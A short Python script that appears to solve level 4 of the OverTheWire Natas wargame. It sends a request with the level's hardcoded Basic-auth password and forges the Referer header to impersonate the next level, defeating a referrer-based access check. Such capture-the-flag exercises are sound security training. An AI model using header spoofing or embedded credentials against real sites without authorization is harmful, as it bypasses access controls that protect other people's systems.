import requests
import base64

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

username = "natas4"
password = "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ"

URL = 'http://natas4.natas.labs.overthewire.org/index.php'
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
headers = {'Authorization':'Basic {}'.format(base64.b64encode((username+':'+password).encode()).decode())}

headers['referer'] = 'http://natas5.natas.labs.overthewire.org/'

response = requests.get(URL, cookies=cookies, headers=headers)

print(response.text)